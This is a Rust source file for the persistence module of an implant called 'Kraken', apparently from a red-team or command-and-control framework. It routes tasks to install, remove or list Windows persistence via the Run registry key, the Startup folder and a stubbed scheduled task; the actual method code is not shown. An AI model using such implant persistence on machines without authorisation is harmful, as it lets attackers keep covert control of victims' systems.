//! mod-persist: Windows persistence mechanisms module for Kraken implant
//!
//! Supports:
//!   - Registry Run key  (HKCU\...\CurrentVersion\Run)
//!   - Startup folder    (%APPDATA%\...\Startup)
//!   - Scheduled task    (stub – returns "not implemented")
//!
//! On non-Windows targets every operation returns a platform error.

use common::{KrakenError, Module, ModuleId, TaskId, TaskResult};
use prost::Message;
use protocol::{persistence_task, PersistenceMethod, PersistenceTask};

mod methods;

pub struct PersistModule {
    id: ModuleId,
}

impl PersistModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("persist"),
        }
    }
}

impl Default for PersistModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for PersistModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Persistence"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task = PersistenceTask::decode(task_data)
            .map_err(|e| KrakenError::Protocol(e.to_string()))?;

        match task.operation {
            Some(persistence_task::Operation::Install(install)) => {
                let method = PersistenceMethod::try_from(install.method)
                    .unwrap_or(PersistenceMethod::PersistUnknown);
                let result = match method {
                    PersistenceMethod::PersistRegistryRun
                    | PersistenceMethod::PersistRegistryRunonce => {
                        methods::install_registry_run(&install.name, &install.payload_path)?
                    }
                    PersistenceMethod::PersistStartupFolder => {
                        methods::install_startup_folder(&install.name, &install.payload_path)?
                    }
                    PersistenceMethod::PersistScheduledTask => {
                        methods::install_scheduled_task(&install.name, &install.payload_path)?
                    }
                    _ => {
                        return Err(KrakenError::Module(format!(
                            "unsupported persistence method: {:?}",
                            method
                        )))
                    }
                };
                Ok(TaskResult::PersistenceOperation(result))
            }

            Some(persistence_task::Operation::Remove(remove)) => {
                let method = PersistenceMethod::try_from(remove.method)
                    .unwrap_or(PersistenceMethod::PersistUnknown);
                let result = match method {
                    PersistenceMethod::PersistRegistryRun
                    | PersistenceMethod::PersistRegistryRunonce => {
                        methods::remove_registry_run(&remove.name)?
                    }
                    PersistenceMethod::PersistStartupFolder => {
                        methods::remove_startup_folder(&remove.name)?
                    }
                    PersistenceMethod::PersistScheduledTask => {
                        methods::remove_scheduled_task(&remove.name)?
                    }
                    _ => {
                        return Err(KrakenError::Module(format!(
                            "unsupported persistence method: {:?}",
                            method
                        )))
                    }
                };
                Ok(TaskResult::PersistenceOperation(result))
            }

            Some(persistence_task::Operation::List(_)) => {
                let result = methods::list_persistence()?;
                Ok(TaskResult::PersistenceList(result))
            }

            None => Err(KrakenError::Protocol("missing persistence operation".into())),
        }
    }
}

// Dynamic loading entry point
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(PersistModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_metadata() {
        let m = PersistModule::new();
        assert_eq!(m.id().as_str(), "persist");
        assert_eq!(m.name(), "Persistence");
    }
}
